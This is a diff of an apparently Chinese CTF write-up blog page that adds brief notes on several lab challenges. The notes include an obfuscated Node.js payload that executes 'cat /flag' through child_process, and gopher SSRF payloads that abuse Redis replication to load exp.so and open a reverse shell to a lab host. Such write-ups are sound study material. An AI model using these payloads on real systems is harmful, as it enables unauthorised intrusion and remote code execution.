@@ -481,21 +481,21 @@ function get_the_flag()&amp;#123;
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-05-16
+                    2023-05-26
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    25.8k
+                    26.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    123 分
+                    127 分
                 </div>
                 
 
@@ -3389,6 +3389,59 @@ echo serialize($a);</code></pre>
 <h2 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2><p>伪造session</p>
 <p>python反序列化</p>
 <h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>构造PHP_SESSION_UPLOAD_PROGRESS的POST请求。就会自动进行session_start()，从而绕过session的判断</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户</a></p>
+<h2 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h2><p>nodejs的一个旧版本特性</p>
+<pre class="language-none"><code class="language-none">在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。</code></pre>
+
+<p>所以就直接Buffer(1000)这种去读内存，多读几次就行</p>
+<h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>使用html markup绕过xss</p>
+<p>联合注入</p>
+<h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p>nodejs的弱类型比较</p>
+<p>加个命令执行的绕过</p>
+<pre class="language-js" data-language="js"><code class="language-js"><span class="token function">Function</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span>
+                    <span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span>
+                    <span class="token number">46</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>
+                    <span class="token number">95</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span>
+                    <span class="token number">121</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<pre class="language-java" data-language="java"><code class="language-java">(Math&#x3D;&gt;(Math&#x3D;Math.constructor,Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41,46,116,111,83,116,114,105,110,103,40,41))()))(Math+1)</code></pre>
+
+<p>看不懂</p>
+<p>我直接爬</p>
+<h2 id="网鼎杯-2020-玄武组-SSRFMe"><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h2><p>SSRF的简单绕过和redis主从复制漏洞</p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a><br><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></strong></p>
+<p>服务器下开启<strong>rogue-server.py</strong> 启动之后用于伪装为主redis，它开启的端口为6666,注意需要将第二个工具exp.so导入到第一个工具下，也就是和rogue-server.py同目录<br>接下来在web界面利用gopher协议入到从redis之中：</p>
+<pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250aconfig%2520set%2520dir%2520&#x2F;tmp&#x2F;%250d%250aquit
+
+
+
+gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520174.1.185.67%25206666%250d%250aquit
+
+
+gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250amodule%2520load%2520&#x2F;tmp&#x2F;exp.so%250d%250asystem.rev%2520174.1.185.67%25206663%250d%250aquit</code></pre>
+
+<p>注释</p>
+<pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root
+config set dir &#x2F;tmp&#x2F;
+quit
+&#x2F;&#x2F;设置备份文件路径为&#x2F;tmp&#x2F; 顺便说一下看到当时大佬的博客说试了很多目录，最后发现只有&#x2F;tmp有权限 ，只需要有读权限即可，所以说平时做渗透或者做题好多试试啊
+
+gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root
+config set dbfilename exp.so
+slaveof 174.1.185.67 6666
+quit
+&#x2F;&#x2F;设置备份文件名为：exp.so，设置主redis地址为174.1.185.67，端口为6666 地址为buu开启的linux lab地址
+
+gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root
+module load &#x2F;tmp&#x2F;exp.so
+system.rev 174.1.185.67 6663
+quit
+&#x2F;&#x2F;导入 exp.so ，反弹shell到174.1.185.67:6663</code></pre>
+
+<h2 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h2><p>二次渲染文件上传</p>
+<h2 id="PHP调用方法7-4-新特性"><a href="#PHP调用方法7-4-新特性" class="headerlink" title="PHP调用方法7.4+新特性"></a>PHP调用方法7.4+新特性</h2><p>[$object, &#39;methodName&#39;]()</p>
+<p><a target="_blank" rel="noopener" href="http://www.plasf.cn/">&gt;Gq安全研究记录 (plasf.cn)</a></p>
+<p>反序列化的时候应该很有用</p>
 
                 
             </div>
@@ -4178,7 +4231,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">255k</span>
+                        class="white-color">259.9k</span>
             
             
             
